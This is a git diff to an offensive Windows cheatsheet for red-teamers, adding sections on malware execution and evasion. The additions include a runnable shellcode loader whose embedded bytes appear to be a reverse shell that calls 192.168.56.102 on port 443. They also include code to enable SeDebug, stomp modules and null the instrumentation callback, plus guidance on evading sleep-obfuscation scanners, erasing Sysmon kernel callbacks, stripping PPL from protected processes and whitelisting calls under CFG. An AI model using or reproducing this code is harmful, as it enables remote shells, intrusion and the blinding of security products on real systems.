@@ -8,11 +8,12 @@ Win32 and Kernel abusing techniques for pentesters & red-teamers made by [@UVisi
   - [PE structure](#pe-headers)
    - [PE Headers ](#pe-headers)
    - [Parsing PE ](#parsing-pe)
-   - [Export Address Table (EAT) ](#export-address-table-eat)
-    - [Resolve function address ](#export-address-table)
+   	- [Export Address Table (EAT) ](#export-address-table-eat)
+  	- [Resolve function address ](#resolve-function-address)
    - [Import Address Table (IAT) ](#import-address-table-iat)
      - [Parsing IAT ](#parsing-iat)
    - [Import Lookup Table (ILT) ](#import-lookup-table)
+   - [Enable SeDebug privilege](#enable-sedebug-privilege)
 - [Execute some binary](#execute-some-binary)
   - [Classic shellcode execution](#classic-shellcode-execution)
   - [DLL execute ](#dll-execute)
@@ -26,10 +27,10 @@ Win32 and Kernel abusing techniques for pentesters & red-teamers made by [@UVisi
   - [Dll injection](#dll-injection)
   - [Process Doppelganging](#process-doppelganging)
   - [Fibers](#fibers)
-  - [CreateThreadPoolWait ⏳]()
-  - [Thread Hijacking ⏳]()
+  - [CreateThreadPoolWait](#createthreadpoolwait)
+  - [Thread Hijacking](#thread-hijacking)
   - [MapView code injection ⏳]()
-  - [Module Stomping ⏳]()
+  - [Module Stomping](#module-stomping)
   - [Function Stomping](#function-stomping)
 - [Hooking techniques](#hooking-techniques)
   - [Inline hooking](#inline-hooking)
@@ -51,8 +52,9 @@ Win32 and Kernel abusing techniques for pentesters & red-teamers made by [@UVisi
   - [Hell's Gate](#hells-gate)
   - [Heaven's Gate](#heavens-gate)
   - [PPID spoofing](#ppid-spoofing)
-  - [Patch Kernel callbacks ⏳]()
-  - [Heap & Stack Encryption ⏳]()
+  - [Process Instrumentation Callback](#process-instrumentation-callback)
+  - [Heap Encryption](#heap-encryption)
+  - [Sleep Obfuscation](#sleep-obfuscation)
 - [Driver Programming basics](#driver-programming-basics)
   - [General concepts](#general-concepts)
   - [System Service Dispatch Table (SSDT)](#system-service-dispatch-table-ssdt)
@@ -60,19 +62,18 @@ Win32 and Kernel abusing techniques for pentesters & red-teamers made by [@UVisi
   - [Input Output)](#input-output)
   - [Communicate with driver](#communicate-with-the-driver)
   - [Driver signing (Microsoft)](#driver-signing)
+  - [Custom callbacks (ObRegisterCallbacks)](#custom-callbacks)
 - [Offensive Driver Programming](#offensive-driver-programming)
-  - [Process protection removing](#process-protection-removing)
-  - [Patch kernel callback (dev way) ⏳]()
-  - [Integrity and privileges levels ⏳]()
-  - [Enable SeDebug privilege ⏳]()
+  - [Patch kernel callback](#patch-kernel-callback)
+  - [Patch protected process](#patch-protected-process)
 - [Using Win32 API to increase OPSEC](#using-win32-api-to-increase-opsec)
   - [Persistence ⏳]()
     - [Scheduled Tasks ⏳]()
   - [Command line spoofing](#command-line-spoofing)
 - [Misc Stuff](#misc-stuff)
-  - [HTTP/S communication ⏳]()
-  - [Indirect Execution ⏳]()
-    - [CFG Bypass with SetProcessValidCallTargets ⏳]()
+  - [x64 Calling Convention](#x64-calling-convention)
+  - [Indirect Execution](#indirect-execution)
+    - [CFG Bypass with SetProcessValidCallTargets](#cfg-bypass-with-setprocessvalidcalltargets)
 
 <br>
 
@@ -196,6 +197,36 @@ It contains all functions name that are in imported DLL.
 
 <br>
 
+
+## Enable SeDebug Privilege
+
+The **SeDebug** privilege is the "most wanted" priv in all the Windows privileges list. It allow you to "debug" any authorized process, which can be translated as several offensives actions, like opening a handle with ```PROCESS_ALL_ACCESS``` privileges.
+
+To enable it in usermode, you will need to use a function such as : 
+
+```cpp
+void EnableDebugPriv()
+{
+    HANDLE hToken;
+    LUID luid;
+    TOKEN_PRIVILEGES tkp;
+
+    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
+
+    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
+
+    tkp.PrivilegeCount = 1;
+    tkp.Privileges[0].Luid = luid;
+    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL);
+
+    CloseHandle(hToken); 
+}
+```
+
+This function will open your current process token, then adjust it to **SE_PRIVILEGE_ENABLED** privilege, wich is corresponding to the target privilege.
+
 # Execute some binary
 
 ## Classic shellcode execution
@@ -293,7 +324,21 @@ Fibers can be defined as ```cooperatively scheduled threads (https://nullprogram
 
 ## MapView code injection ⏳
 
-## Module Stomping ⏳
+## Module Stomping
+
+This technique cause your beacon to be backed by a module on disk
+
+```c
+CHAR moduleName[]  = "windows.storage.dll\x00";
+HMODULE hVictimLib = LoadLibraryA(moduleName);
+
+DWORD_PTR RXSection = (DWORD_PTR)hVictimLib;
+RXSection 	   += 0x1000 * 0x2;
+RXSection  	   += 0xc;
+char* ptr 	    = ( char* )RXSection;
+```
+
+> to detect module stomping (especially for Cobalt Strike) a scanner was released named [DetectCobaltStomp](https://github.com/slaeryan/DetectCobaltStomp) to highlight some IoCs of the technique, but the [author](https://twitter.com/NinjaParanoid) of [Brute Ratel](https://bruteratel.com/) managed to [improve](https://www.youtube.com/watch?v=nPmcFKSHyvg&ab_channel=ChetanNayak) the original technique.
 
 ## Function Stomping
 
@@ -509,12 +554,79 @@ Code sample : // to add
 
 To avoid using hardcoded syscalls, Hell's Gate (Hells Gates ?) retrieve them dynamically by parsing EAT (compare memory bytes to syscall opcodes). The original Poc has been made by the great VX-Underground team, and can be found here : https://papers.vx-underground.org/papers/Windows/Evasion%20-%20Systems%20Call%20and%20Memory%20Evasion/Dynamically%20Retrieving%20SYSCALLs%20-%20Hells%20Gate.7z
 
+Another one example : https://github.com/am0nsec/HellsGate
+
 ## Heavens Gate
 
 Use Wow64 to inject 64 bits payload in 32 bits loader. Can be useful to bypass some AV/EDRs because Wow64 will avoid you to be catch in userland.
 
 The most known version of this technique has been created by the MSF team, see their awesome work here : https://github.com/rapid7/metasploit-framework/blob/21fa8a89044220a3bf335ed77293300969b81e78/external/source/shellcode/windows/x86/src/migrate/executex64.asm
 
+## CreateThreadPoolWait
+
+By abusing CreateThreadPoolWait(), which can accept a pointer to a callback function, you can execute your shellcode through this proc. Lot of similar techniques (using a callback function pointer) are available at : http://ropgadget.com/posts/abusing_win_functions.html
+
+Example : 
+
+```cpp
+//code from https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-via-createthreadpoolwait
+
+#include <windows.h>
+#include <threadpoolapiset.h>
+
+unsigned char shellcode[] = 
+"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
+"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
+"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
+"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
+"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
+"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
+"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
+"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
+"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
+"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
+"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
+"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
+"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
+"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
+"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
+"\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x38\x66\x41\x54"
+"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
+"\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
+"\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
+"\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
+"\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
+"\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"
+"\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
+"\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
+"\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"
+"\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
+"\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"
+"\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
+"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
+"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
+"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
+
+
+int main()
+{
+	HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);
+	LPVOID shellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	RtlMoveMemory(shellcodeAddress, shellcode, sizeof(shellcode));
+
+	PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)shellcodeAddress, NULL, NULL);
+	SetThreadpoolWait(threadPoolWait, event, NULL);
+	WaitForSingleObject(event, INFINITE);
+	
+	return 0;
+}
+```
+
+## Thread Hijacking
+
+Hijack a thread into a remote process by suspend it, then replace its RIP register (or EIP if you are in x86) with your own shellcode address. 
+
+Code example : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/shellcode_samples/thread_hijacking.c
 
 ## PPID Spoofing
 
@@ -549,9 +661,47 @@ int main()
 }
 ```
 
-## Patch Kernel callbacks ⏳
+## Process Instrumentation Callback
 
-## Heap & Stack Encryption ⏳
+Process Instrumentation Callback is defined as the `ProcessInstrumentationCallback` flag (`0x40`) and is used by security products to [detect potential direct syscall](https://winternl.com/detecting-manual-syscalls-from-user-mode/) invocation by registering a callback to check if the `syscall` instruction comes from the executable image and not NTDLL. To bypass it for our process we just have to set `Callback` to `NULL`
+
+```c
+PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION InstrumentationCallbackInfo;
+
+InstrumentationCallbackInfo.Version  = 0x0;
+InstrumentationCallbackInfo.Reserved = 0x0;
+InstrumentationCallbackInfo.Callback = NULL;
+
+NtSetInformationProcess( hProcess, ProcessInstrumentationCallback, &InstrumentationCallbackInfo, sizeof( InstrumentationCallbackInfo ) );
+```
+> it's still "undocumented" by microsoft but [Alex Ionescu](https://twitter.com/aionescu) has documented it [here](https://www.youtube.com/watch?v=pHyWyH804xE&ab_channel=S%C3%A9bastienDuquette) and Everdox has also done so [here](https://www.codeproject.com/Articles/543542/Windows-x64-system-service-hooks-and-advanced-debu)
+
+> Full code to bypass instrumentation here : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/evasion/disable_instrumentation_callback.c
+
+## Heap Encryption
+
+Walk the heap with `HeapWalk` and then encrypt the allocations :
+```c
+VOID HeapEncryptDecrypt() {
+    PROCESS_HEAP_ENTRY HeapWalkEntry;
+    SecureZeroMemory( &HeapWalkEntry, sizeof( HeapWalkEntry ) );
+    while ( HeapWalk( GetProcessHeap(), &HeapWalkEntry ) ) {
+        if ( ( HeapWalkEntry.wFlags & PROCESS_HEAP_ENTRY_BUSY ) != 0 ) {
+            XORFunction( key, keySize, ( char* )( HeapWalkEntry.lpData ), HeapWalkEntry.cbData );
+        }
+    }
+}
+```
+> more informations here: https://www.arashparsa.com/hook-heaps-and-live-free/
+
+## Sleep Obfuscation
+
+Many PoCs around sleep obfuscation came out with different mechanisms (UM APCs, TP and more) here we take as example [Ekko](https://github.com/Cracked5pider/Ekko/) which is the most easiest PoC to understand.
+
+the ROP chain of Ekko is very simple, it changes memory prot. to `RW`, encrypt the region with `SystemFunction032` which implement RC4, Sleep with `WaitForSingleObject`, Decrypt the region and switch again the prot. to `RWX`. Finally, it queues all `CONTEXT` with `CreateTimerQueueTimer`
+
+
+> Some scanners like [TickTock](https://github.com/WithSecureLabs/TickTock) or [Patriot](https://github.com/joe-desimone/patriot) has been released to detect that but you can avoid them by using a trampoline to `NtContinue` in NTDLL with gadget and replacing `Rip` register in ROP chain
  
 <br>
  
@@ -651,7 +801,7 @@ It will be used to send various requests to its **Device** object.
 
 Simple sample code here : //todo
 
-## Driver signing (Microsoft)
+## Driver signing
 
 As described in [General concepts](#general-concepts) section, drivers must be signed before to install on a Windows system. Despite the fact you must use some driver or kernel exploit to bypass it (Gigabyte driver CVE for example), you can still disable it manually:
 ```powershell
@@ -661,22 +811,120 @@ bcdedit.exe -set TESTSIGNING ON
 Then restart your computer. Obviously you need local admin rights on the machine you want to execute these command. As a restart is needed, **this not OPSEC at all**.
 
 
+## Custom Callbacks
+
+ObRegisterCallbacks (wdm.h) allow you to defined "custom" callbacks that can be used to modify behavior of a usermode app when being triggered by a specific operation, like CreateProcess/OpenProcess (Handle create).
+
+Basically, Ob Callbacks are defined with a OB_OPERATION_REGISTRATION array, which will be filled with OB_CALLBACK_REGISTRATION struct (filled with callbacks).
+
+Example to trigger on OpenProcess/CreateProcess :
+
+```c
+OB_OPERATION_REGISTRATION obOperationRegistrationArray[1] = { 0 };
+OB_CALLBACK_REGISTRATION obCallbackRegistration = { 0 };
+
+obOperationRegistrationArray[0].ObjectType = PsProcessType; //monitor for handles
+obOperationRegistrationArray[0].Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE; //detect created and duplicated handles
+obOperationRegistrationArray[0].PreOperation = process_ob_pre_op_callbacks; //intercept before the end of the operation with a pointer to a defined function in your own code
+obOperationRegistrationArray[0].PostOperation = NULL; //do nothing after the operation has been completed
+
+NTSTATUS status_register = ObRegisterCallbacks(&obCallbackRegistration, &reg_handle); //register callbacks
+	if (!NT_SUCCESS(status_register)) {
+		DbgPrint("[-] Error while trying to register callbacks\n");
+	}
+	else {
+
+		DbgPrint("[+] Registering callbacks !\n");
+	}
+```
+
+**process_ob_pre_op_callbacks** is a user defined function which will be called when the the callback will be intercepted, and therefore can disallow or allow the operation.
+
+```c
+OB_PREOP_CALLBACK_STATUS process_ob_pre_op_callbacks(PVOID registrationContext, POB_PRE_OPERATION_INFORMATION pObPreOperationInformation) {
+
+	if (pObPreOperationInformation->KernelHandle) return OB_PREOP_SUCCESS; //if handle is a kernel handle, pass
+	pObPreOperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~My_PROCESS_ALL_ACCESS; //remove PROCESS_ALL_ACCESS from handle
+}
+```
+
+**Note** : My_PROCESS_ALL_ACCESS can be defined as ```#define My_PROCESS_ALL_ACCESS (0x1FFFFF)``` (win32 hexa code).
+
+
 # Offensive Driver Programming
 
-## Process protection removing
+## Patch kernel callback
 
-A **protected process** have the "protected" mode enable in the kernel : using the PPL (Protected Process Light) technology, it can be protected from various things like code injection, memory dump, etc. You can enable it for lsass to avoid password dumping by modifying some reg keys.
+Kernel Callbacks were introduced by Microsoft mainly to offer a better way to AVs/EDRs editors to monitor and prevent suspicious actions (Before them, lot of security products were using kernel mode patching like SSDT hooks to do the same job, but the new PatchGuard protection constrained them to use this new solution).
 
-To remove this protection, you must load some malicious driver.
+They are several types of kernel callbacks, especially : 
 
-Code sample : //
+	- ProcessNotify : called when a process is created or exits.
+	- ThreadNotify : called when a thread is created or exits (is deleted).
+	- LoadImageNotify : called when some executable image is loaded by an other exe (example : DLL loaded by a process)
 
-## Patch kernel callback (dev way) ⏳
+Each of them has its associated function, such as **PsSetCreateProcessNotifyRoutineEx** to set them in your driver. The latter register a callback routine as a new process is created or deleted in the Windows system. Its prototype is defined as below : 
 
-## Integrity and privileges levels ⏳
+```cpp
+NTSTATUS PsSetCreateProcessNotifyRoutineEx(
+  [in] PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine,
+  [in] BOOLEAN                           Remove
+);
+```
 
-## Enable SeDebug privilege ⏳
+**PCREATE_PROCESS_NOTIFY_ROUTINE_EX** is a pointer to the callback routine which will be called when the event will be triggered (here, process created/exits).
+**Remove** is a simple flag which indicate if PsSetCreateProcessNotify will register the callback function or delete it (useful in your driver's cleanup function).
 
+The callback function will use this prototype : 
+
+```cpp
+void OnProcessNotify(
+    PEPROCESS Process,
+    HANDLE ProcessId,
+    PPS_CREATE_NOTIFY_INFO CreateInfo
+);
+```
+where **Process** is the current process being created/deleted, **ProcessId** is the id of this process, and **CreateInfo** is a structure that contains various info about this process.
+
+When a driver registers a new callback routine, its address will be stored in an array usually named **Psp**name_of_your_callback. For example, the list of all ProcessNotifyRoutine functions is stored in the **PspCreateProcessNotifyRoutine** array.
+
+To remove such callbacks, you will simply need to empty this array !
+
+Unfortunately, the address of this so exciting array does not have any direct way to be retrieved. Fortunately, they are many ways to do so manually, by searching for some specific offsets in memory.
+
+Once you find the right address, you can enumerate all callbacks registered and filter them by driver name (Sysmon driver maybe ?:)), and only remove the corresponding callback functions in the list.
+
+
+
+## Patch Protected Process
+
+Protected Processes were introduced with Windows Vista. It can be defined as a struct named EPROCESS (undefined : https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/eprocess) which define if the process is protected or not with three interesting members : 
+
+```
+kd> dt nt!_EPROCESS
+   +0x000 Pcb              : _KPROCESS
+   +0x2d8 ProcessLock      : _EX_PUSH_LOCK
+   +0x2e0 UniqueProcessId  : Ptr64 Void
+   [...snip...]
+   +0x6c8 SignatureLevel   : UChar //signature integrity of exe
+   +0x6c9 SectionSignatureLevel : UChar //Second member : same as first for DLL loaded by the exe
+   +0x6ca Protection       : _PS_PROTECTION
+```
+The third member (Protection) is a PS_PROTECTION struct which is defined as below :
+
+```
+_PS_PROTECTION
+  +0x000 Level            : UChar
+  +0x000 Type             : Pos 0, 3 Bits
+  +0x000 Audit            : Pos 3, 1 Bit
+  +0x000 Signer           : Pos 4, 4 Bits
+```
+
+To remove PPL protection, you must set SignatureLevel,SectionSignatureLevel and Protection to 0.
+
+As the offset between EPROCESS base address and PS_PROTECTION is 0x6c8, you can retrieve it by additionate the two values.
+
+Example code : //todo
 
 
 # Using Win32 API to increase OPSEC
@@ -695,11 +943,38 @@ Poc : https://github.com/NVISOsecurity/blogposts/blob/master/examples-commandlin
  
 # Misc Stuff
 
-## HTTP/S communication
+## x64 Calling Convention
+
+- First 4 integer arguments are passed in registers `RCX`, `RDX`, `R8`, and `R9`.
+- Additional arguments are pushed onto the stack.
+- The return address is followed by a 32-byte area reserved for `RCX`, `RDX`, `R8`, and `R9`.
+- Local variables and non-volatile registers are stored above the return address.
+- `RBP` is not used to reference local variables/function arguments, and `RSP` remains constant throughout the function.
+
+> Notes:
+> - If a function has a variable number of arguments, it must use the stack to pass them
+> - If the return value is a structure, then the caller is responsible for allocating space for the return value and passing a pointer to that space as the first argument
+> - The callee is responsible for preserving the values of the `RBX`, `RBP`, and `R12`–`R15` registers, but may freely modify the other registers
+> - The stack is aligned to a 16-byte boundary at the call site
+> - The callee is responsible for restoring the stack pointer (`RSP`) to its original value before returning
 
 ## Indirect Execution
 
+Indirect Execution here refers to a ROP to achieve the execution of some tasks, you will need to add parameters to the right register, you must understand [x64 calling convention](https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet#x64-calling-convention) for that.
+
+- ROP with `CONTEXT` structure will need `RtlCaptureContext` to retrieve the current context and `NtContinue` to continue the execution of the ROP with `CONTEXT` struct as parameter filled with the right function arguments to the right registers. You can also build your ROP in assembly if you want.
+
 ### CFG Bypass with SetProcessValidCallTargets
+
+This is not a real bypass but it'll whitelist the function you're using in your ROP (i.e. `NtContinue`)
+```c
+CFG_CALL_TARGET_INFO Cfg = { 0 };
+
+Cfg.Offset = ( ULONG_PTR )pAddress - ( ULONG_PTR )Mbi.BaseAddress;
+Cfg.Flags  = CFG_CALL_TARGET_VALID;
+
+SetProcessValidCallTargets( ( HANDLE )-1,  Mbi.BaseAddress, Mbi.RegionSize, 1, &Cfg );
+```
 
 
 
